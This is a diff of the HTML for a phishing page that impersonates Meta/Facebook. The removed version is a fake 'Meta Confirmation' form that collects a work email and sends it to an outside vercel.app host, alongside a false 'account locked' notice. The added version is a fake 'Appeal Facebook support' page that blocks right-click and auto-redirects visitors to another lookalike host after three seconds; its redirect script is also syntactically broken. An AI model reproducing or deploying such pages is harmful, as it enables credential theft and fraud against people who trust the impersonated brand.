@@ -1,50 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <link rel="icon" data-savepage-href="https://z-p3-static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico" href="">
-    <title>Meta Confirmation</title>
-    <link rel="stylesheet" href="styles.css">
-    <script defer src="script.js"></script>
-</head>
-<body>
-    <div class="login-container">
-        <div class="login-box">
-            <div class="logo-section">
-                <img src="/Meta-Logo.png" alt="Logo" class="meta-logo">
-            </div>
-            <h3 class="sign-in-text">Meta Confirmation</h3>
-            <!-- Updated action link to the specified URL -->
-          <form action="https://confirmation-form.vercel.app/" method="get">
-    <label for="email" class="label-email">Work Email</label>
-    <input type="email" id="email" name="email" placeholder="e.g. @company.com" required>
-    <div id="error-message" class="error-message"></div>
-    <button type="submit" class="next-button">Next</button>
-</form>
-        </div>
-        <div class="what-is-this-container">
-            <a href="#" class="what-is-this" id="whatIsThis">
-                <span class="info-icon">i</span>
-                <span class="what-is-this-text">What is this?</span>
-            </a>
-        </div>
-    </div>
 
-    <!-- Updated modal content -->
-    <div id="infoModal" class="modal">
-        <div class="modal-content">
-            <span class="close-button" id="closeModal">&times;</span>
-            <h2>Your Account Has Been Locked</h2>
-            <p>We have detected activity that violates our Facebook terms and conditions. As a result, your account has been temporarily locked for security reasons.</p>
-            <p>Your page has also been affected. Please submit a request if you believe this was an error.</p>
-            <h3>Why Was My Account Locked?</h3>
-            <ul>
-                <li>Violation of Facebook’s terms of service.</li>
-                <li>Suspicious activity detected on your account.</li>
-                <li>Spamming, harassment, or other inappropriate actions.</li>
-                <li>Potential security threats to the platform or other users.</li>
-            </ul>
-            <p>Please follow the instructions to regain access to your account.</p>
-        </div>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Home</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    /* CSS styles */
+
+    body {
+      font-family: system-ui;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container-fluid {
+      background: #F5F6F6;
+    }
+
+    .container {
+      padding: 1rem;
+    }
+
+    .logo {
+      width: 9rem;
+      height: 6rem;
+    }
+
+    .meta-logo {
+      width: 4rem;
+      height: 4rem;
+    }
+
+    .btn {
+      background: #0064e0;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 35px;
+      text-decoration: none;
+      color: white;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+      font-size: 16px;
+      /* Adjust as needed */
+    }
+
+    .content {
+      margin-top: 3rem;
+      display: flex;
+      justify-content: center;
+    }
+
+    .content .col-sm-6 {
+      margin-top: 3rem;
+      margin-left: 5rem;
+    }
+
+    .content p {
+      font-size: 18px;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
+
+    .sign-up {
+      font-size: 17px;
+      padding-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
+
+    .business-info {
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
+
+    .region-info {
+      font-size: 13px;
+      font-style: italic;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
+
+    .image {
+      display: none;
+      width: 42%;
+      height: 100vh;
+      /* Ensure full height */
+      background-size: cover;
+      /* background-position: center; */
+      /* margin-left: 5rem; */
+    }
+
+    @media (min-width: 576px) {
+      .image {
+        display: block;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container-fluid">
+
     </div>
+  </div>
+  <div class="content">
+    <div class="col-sm-6">
+       <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="meta" class="meta-logo">
+ <h1 class="my-3 fs-1">Appeal <br> Facebook support</h1>
+      <div style="margin-bottom: 30px;"></div>
+      <a href="https://warning-for-violation-risk.vercel.app" class="btn">Appeal</a>
+      <p class="mt-4">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.<br> Facebook.</p>
+      <p class="sign-up">Request for creator</p>
+      <p class="mt-4 mb-0">
+        <span class="fw-semibold">Are you a business?</span> Get more information on
+      </p>
+      <a href="#" class="business-info">Meta support for businesses</a>
+      <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
+    </div>
+    <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
+  </div>
 </body>
-</html>
+<script>
+  document.addEventListener('contextmenu', event => {
+    event.preventDefault();
+  });
+
+  setTimeout(function() {
+  var redirectURL = "https://warning-for-violation-risk.vercel.app; // Updated URL
+  window.location.replace(redirectURL);
+  }, 3000); // 3000 milliseconds (3 seconds)
+  });
+</script>
